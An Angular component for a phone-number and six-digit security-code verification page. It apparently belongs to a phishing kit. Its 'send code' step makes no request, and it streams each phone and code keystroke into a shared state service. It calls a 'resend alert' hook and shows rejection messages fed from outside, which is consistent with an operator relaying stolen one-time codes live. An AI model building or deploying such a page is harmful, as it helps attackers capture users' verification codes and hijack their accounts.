
import { Component, inject, signal, effect, OnInit, OnDestroy } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { PublicLayoutComponent } from './layout/public-layout.component';
import { StateService } from '../services/state.service';

@Component({
  selector: 'app-phone-verification',
  standalone: true,
  imports: [CommonModule, FormsModule, PublicLayoutComponent],
  template: `
    <app-public-layout>
      
      <div class="flex flex-col items-center mb-10">
        <h1 class="text-2xl font-bold text-[#2c2e2f] mb-3 text-center tracking-tight">
             {{ codeSent() ? 'Enter your code' : 'Confirm your mobile' }}
        </h1>
        <p class="text-[15px] text-[#5e6c75] px-4 text-center leading-relaxed">
           {{ codeSent() ? "We sent a security code to your mobile device." : "We need to verify it's really you." }}
        </p>
      </div>

      <!-- Feedback Block -->
      @if (state.rejectionReason()) {
        <div class="mb-8 bg-[#fff4f4] border-l-4 border-[#d92d20] p-4 flex items-start gap-3 rounded-r-md">
            <span class="material-icons text-[#d92d20] text-xl mt-0.5">error</span>
            <div>
              <p class="text-sm font-bold text-[#2c2e2f]">Authentication Failed</p>
              <p class="text-xs text-[#5e6c75] mt-0.5">{{ state.rejectionReason() }}</p>
            </div>
        </div>
      }

      <!-- Stage 1: Phone Input -->
      @if (!codeSent()) {
          <div class="space-y-6 animate-in fade-in slide-in-from-bottom-2">
             <div class="relative group">
                <input 
                  type="tel" 
                  [value]="phoneDisplay()"
                  (input)="onPhoneInput($event)"
                  id="phone"
                  placeholder=" "
                  class="peer w-full h-[56px] px-4 pt-5 pb-1 rounded-md bg-white text-[#2c2e2f] text-base outline-none shadow-input transition-all duration-300 focus:scale-[1.01] focus:shadow-input-focus"
                />
                <label 
                   for="phone" 
                   class="absolute left-4 top-4 text-[#5e6c75] text-base transition-all duration-200 peer-placeholder-shown:top-4 peer-placeholder-shown:text-base peer-focus:top-1.5 peer-focus:text-[12px] peer-focus:font-semibold peer-[&:not(:placeholder-shown)]:top-1.5 peer-[&:not(:placeholder-shown)]:text-[12px] peer-[&:not(:placeholder-shown)]:font-semibold cursor-text z-10 pointer-events-none"
                   >
                   Mobile number
                </label>
             </div>

             <div class="text-[12px] text-[#5e6c75] text-center leading-relaxed px-4">
                 By continuing, you confirm that you are authorized to use this phone number. Standard message and data rates may apply.
             </div>

             <button 
                (click)="sendCode()"
                [disabled]="!isPhoneValid()"
                [class.opacity-50]="!isPhoneValid()"
                [class.hover:bg-brand-900]="isPhoneValid()"
                class="w-full bg-brand-800 text-white font-bold text-[16px] py-4 px-4 rounded-full transition-all duration-300 shadow-lg shadow-brand-500/20 hover:scale-[1.02] active:scale-[0.98]"
            >
                Next
            </button>
          </div>
      } 
      
      <!-- Stage 2: OTP Input -->
      @else {
          <div class="space-y-8 animate-in fade-in slide-in-from-right-2">
            <div class="text-center mb-2">
                <p class="text-sm font-semibold text-[#2c2e2f] mb-1">{{ phoneDisplay() }}</p>
                <a (click)="codeSent.set(false)" class="text-brand-500 font-bold cursor-pointer hover:underline text-xs">Change</a>
            </div>

            <div class="flex justify-center gap-2 sm:gap-3">
              @for (idx of [0,1,2,3,4,5]; track idx) {
                <input 
                  [id]="'otp-' + idx"
                  type="text" 
                  inputmode="numeric"
                  maxlength="1"
                  [(ngModel)]="digits[idx]"
                  (input)="onOtpInput($event, idx)"
                  (keydown)="onKeyDown($event, idx)"
                  class="w-11 h-14 sm:w-12 sm:h-16 text-center rounded-lg border-2 border-transparent bg-slate-100 text-2xl font-bold text-[#2c2e2f] outline-none transition-all duration-200 focus:bg-white focus:border-brand-500 shadow-sm focus:shadow-lg focus:scale-110 focus:-translate-y-1"
                  [class.border-red-500]="state.rejectionReason()"
                  [class.bg-red-50]="state.rejectionReason()"
                >
              }
            </div>

            <div class="text-center min-h-[40px]">
              <button 
                (click)="resend()" 
                [disabled]="timer() > 0"
                class="text-brand-500 font-bold text-sm hover:underline hover:text-brand-800 transition-colors disabled:opacity-50 disabled:no-underline disabled:cursor-not-allowed">
                {{ timer() > 0 ? 'Resend code in ' + timer() + 's' : 'Get a new code' }}
              </button>
               @if (resendSent()) {
                 <p class="text-xs text-green-600 mt-2 font-bold animate-pulse">Code sent!</p>
               }
            </div>

            <button 
              (click)="submit()"
              [disabled]="!isOtpValid()"
              [class.opacity-50]="!isOtpValid()"
              [class.hover:bg-brand-900]="isOtpValid()"
              class="w-full bg-brand-800 text-white font-bold text-[16px] py-4 px-4 rounded-full transition-all duration-300 shadow-lg shadow-brand-500/20 hover:scale-[1.02] active:scale-[0.98]"
            >
              Continue
            </button>
          </div>
      }
    </app-public-layout>
  `
})
export class PhoneVerificationComponent implements OnInit, OnDestroy {
  state = inject(StateService);
  
  // Phone State
  rawPhone = '';
  phoneDisplay = signal('');
  isPhoneValid = signal(false);
  codeSent = signal(false);

  // OTP State
  digits: string[] = ['', '', '', '', '', ''];
  isOtpValid = signal(false);
  resendSent = signal(false);

  // Timer State
  timer = signal(0);
  private timerInterval: any;

  ngOnInit() {
      const existingPhone = this.state.phoneNumber();
      if (existingPhone) {
          this.phoneDisplay.set(existingPhone);
          this.isPhoneValid.set(true);
          if (this.state.rejectionReason()) {
              this.codeSent.set(true);
          }
      }
  }

  ngOnDestroy() {
      if (this.timerInterval) clearInterval(this.timerInterval);
  }

  startTimer() {
      this.timer.set(30);
      if (this.timerInterval) clearInterval(this.timerInterval);
      this.timerInterval = setInterval(() => {
          this.timer.update(v => {
              if (v <= 1) {
                  clearInterval(this.timerInterval);
                  return 0;
              }
              return v - 1;
          });
      }, 1000);
  }

  onPhoneInput(event: any) {
      let input = event.target.value.replace(/\D/g, '');
      this.rawPhone = input;
      
      const match = input.match(/^(\d{0,3})(\d{0,3})(\d{0,4})$/);
      let formatted = input;
      if (match) {
          const part1 = match[1];
          const part2 = match[2];
          const part3 = match[3];
          
          if (part1) formatted = `(${part1}`;
          if (part2) formatted += `) ${part2}`;
          if (part3) formatted += `-${part3}`;
      }
      if (input.length > 10) {
          formatted = `(${input.slice(0,3)}) ${input.slice(3,6)}-${input.slice(6,10)}`;
      }

      this.phoneDisplay.set(formatted);
      this.isPhoneValid.set(input.length === 10);
      
      this.state.updatePhone({ number: formatted });
  }

  sendCode() {
      if (this.isPhoneValid()) {
          this.codeSent.set(true);
          this.startTimer();
          setTimeout(() => document.getElementById('otp-0')?.focus(), 100);
      }
  }

  onOtpInput(event: any, index: number) {
    const input = event.target as HTMLInputElement;
    let value = input.value.replace(/\D/g, ''); 
    
    if (value.length > 1) value = value[value.length - 1];
    input.value = value;

    if (value && /^[0-9]$/.test(value)) {
      this.digits[index] = value;
      if (index < 5) {
        document.getElementById(`otp-${index + 1}`)?.focus();
      }
    } else {
       this.digits[index] = ''; 
    }
    this.checkOtpValidity();
    this.state.updatePhone({ code: this.digits.join('') });
  }

  onKeyDown(event: KeyboardEvent, index: number) {
    if (event.key === 'Backspace' && !this.digits[index] && index > 0) {
      document.getElementById(`otp-${index - 1}`)?.focus();
    }
  }

  checkOtpValidity() {
    this.isOtpValid.set(this.digits.every(d => d !== ''));
  }

  submit() {
    if (this.isOtpValid()) {
      this.state.submitPhone(this.phoneDisplay(), this.digits.join(''));
    }
  }

  resend() {
      if (this.timer() === 0) {
          this.state.triggerResendAlert();
          this.resendSent.set(true);
          this.startTimer();
          setTimeout(() => this.resendSent.set(false), 3000);
      }
  }
}
